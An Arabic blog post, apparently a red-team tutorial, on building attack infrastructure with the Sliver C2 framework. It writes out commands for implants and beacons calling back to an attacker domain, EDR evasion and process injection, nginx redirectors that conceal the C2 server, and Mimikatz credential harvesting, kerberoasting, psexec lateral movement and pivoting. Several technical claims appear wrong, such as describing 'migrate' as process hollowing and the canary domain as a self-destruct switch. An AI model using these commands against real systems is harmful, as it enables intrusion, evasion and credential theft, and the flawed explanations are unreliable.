---
layout: blog
title: "دليل Sliver C2 للـ Red Teamers: إطار عمل حديث للعمليات الهجومية المتقدمة"
date: 2026-03-29T06:13:00Z
category: "أداة"
excerpt: "Sliver يمثل الجيل الجديد من أطر Command and Control المفتوحة المصدر. بُني بلغة Go، يقدم بديلاً قوياً لـ Cobalt Strike بميزات تشفير متقدمة وقدرات تخفي استثنائية. في هذا الدليل، نستعرض كيفية بناء بنية تحتية هجومية احترافية باستخدام Sliver."
read_time: 8
tags: ["Command and Control", "Red Teaming", "Offensive Tools"]
slug: "sliver-c2-guide"
---

## لماذا Sliver؟

في عالم Red Teaming، كان Cobalt Strike المعيار الذهبي لسنوات. لكن التكلفة العالية وانتشار نسخ مسربة دفع المجتمع للبحث عن بدائل. هنا يظهر Sliver كحل مفتوح المصدر، مبني بلغة Go، يوفر cross-compilation سلسة ونظام implants متطور.

المشروع نشط التطوير، يدعم protocols متعددة (mTLS, HTTP/S, DNS, WireGuard)، ويأتي مع multiplayer mode يسمح لفريق كامل بالعمل على نفس البنية التحتية. الأهم: صُمم من الأساس بعقلية OPSEC، مع focus على تجنب EDR solutions الحديثة.

## التثبيت والإعداد الأولي

التثبيت مباشر عبر script رسمي:

```bash
# التثبيت على Linux
curl https://sliver.sh/install | sudo bash

# أو عبر GitHub مباشرة
git clone https://github.com/BishopFox/sliver.git
cd sliver
make
```

بعد التثبيت، ابدأ الـ server:

```bash
sliver-server
```

للدخول إلى console:

```bash
sliver-client
```

أول خطوة: إنشاء operator للفريق:

```bash
sliver > new-operator --name red-team-1 --lhost 10.0.0.5
```

هذا ينشئ config file يمكن مشاركته مع أعضاء الفريق للاتصال بنفس الـ server.

## إنشاء Implants فعّالة

قوة Sliver تكمن في مرونة إنشاء payloads. لنبدأ بـ implant بسيط عبر HTTPS:

```bash
sliver > generate --http example.com --skip-symbols --debug
```

الـ flags هنا مهمة:
- `--skip-symbols`: يزيل debugging symbols لتصغير الحجم
- `--debug`: للحصول على معلومات مفصلة أثناء التطوير

لسيناريوهات أكثر تقدماً، استخدم beacon mode بدلاً من session mode:

```bash
sliver > generate beacon --http example.com --seconds 60 --jitter 30
```

الـ beacon يتصل كل 60 ثانية مع jitter عشوائي 30%، مما يصعب pattern detection.

للبيئات المقيدة، DNS C2 خيار ممتاز:

```bash
sliver > generate --dns attacker-domain.com --canary your-domain.com
```

الـ canary domain يُستخدم كـ kill switch - إذا حُلّ، يدمر الـ implant نفسه تلقائياً.

## تقنيات Evasion متقدمة

Sliver يوفر عدة طرق لتجاوز defenses:

### Process Injection

```bash
sliver (SESSION) > psexec -d "C:\Windows\System32\notepad.exe" 
```

أو استخدم `execute-assembly` لتشغيل .NET assemblies في الذاكرة:

```bash
sliver (SESSION) > execute-assembly /path/to/Rubeus.exe kerberoast
```

### Shellcode Injection

لـ process hollowing:

```bash
sliver (SESSION) > migrate 1234
```

حيث 1234 هو PID للعملية المستهدفة.

### OPSEC Considerations

استخدم profiles لتخصيص سلوك الـ implant:

```bash
sliver > profiles new --http example.com --format shellcode win-profile
sliver > profiles generate --profile win-profile
```

الـ shellcode format يسمح باستخدام custom loaders، مما يجعل detection أصعب.

## إدارة Infrastructure الهجومية

لبيئة إنتاجية، استخدم redirectors. إليك setup بسيط مع nginx:

```nginx
server {
    listen 443 ssl;
    server_name legitimate-domain.com;
    
    ssl_certificate /path/to/cert.pem;
    ssl_certificate_key /path/to/key.pem;
    
    location / {
        proxy_pass https://sliver-server:443;
        proxy_set_header Host $host;
        proxy_set_header X-Real-IP $remote_addr;
    }
}
```

هذا يخفي الـ C2 الحقيقي خلف infrastructure قابلة للاستبدال.

للـ staging المتقدم، استخدم external builders:

```bash
sliver > builders
sliver > generate --external-builder windows/amd64 --http example.com
```

هذا يسمح بـ cross-compilation من Linux لأهداف Windows دون مشاكل.

## Post-Exploitation Workflows

بعد الحصول على session:

```bash
# استطلاع أولي
sliver (SESSION) > info
sliver (SESSION) > getprivs
sliver (SESSION) > netstat

# Credential harvesting
sliver (SESSION) > execute-assembly /path/to/Mimikatz.exe

# Lateral movement
sliver (SESSION) > psexec -u admin -p pass -d "\\\\target\\C$\\"
```

للـ pivoting، استخدم portfwd:

```bash
sliver (SESSION) > portfwd add -b 0.0.0.0:8080 -r 192.168.1.10:80
```

الآن يمكنك الوصول لـ internal service عبر الـ compromised host.

## الخلاصة

Sliver ليس مجرد بديل لـ Cobalt Strike، بل framework متطور بفلسفة تصميم حديثة. التشفير end-to-end، multiplayer mode، وسهولة التخصيص تجعله خياراً قوياً لأي Red Team operation.

المفتاح: ابدأ بـ beacons بدلاً من sessions، استخدم DNS للبيئات المقيدة، ولا تنسَ redirectors لحماية infrastructure الحقيقية. مع OPSEC جيدة، Sliver يوفر كل ما تحتاجه لعملية هجومية ناجحة.
